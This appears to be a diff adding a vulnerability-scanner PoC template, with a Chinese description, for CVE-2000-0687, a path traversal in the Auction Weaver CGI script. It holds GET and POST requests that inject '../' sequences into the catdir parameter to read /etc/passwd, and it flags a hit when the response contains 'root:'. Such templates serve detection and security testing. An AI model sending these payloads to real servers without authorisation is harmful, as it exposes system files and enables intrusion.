@@ -1,0 +1,60 @@
+[info]
+author = "ave"
+description = "检测 Auction Weaver CGI 脚本 1.03 及更早版本中 catdir 参数的路径遍历漏洞。通过向 catdir 参数注入 .. 序列，攻击者可突破目录限制读取服务器任意文件。"
+id = "POC-AVE-2000-1500"
+name = "CVE-2000-0687 Auction Weaver Path Traversal PoC"
+severity = "critical"
+tags = ["ave-2000-1500"]
+vuln_id = [
+    "CVE-2000-0687",
+    "AVE-2000-1500",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/auction/auction.cgi?catdir=../../../../etc/passwd"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin/bash",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/cgi-bin/auction/auction.cgi?catdir=../../../etc/passwd"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin/bash",
+]
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/cgi-bin/auction/auction.cgi"
+protocol = "http"
+
+[poc.requests.body]
+content = "catdir=../../../../etc/passwd"
+type = "form"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root:",
+    "bin/bash",
+]
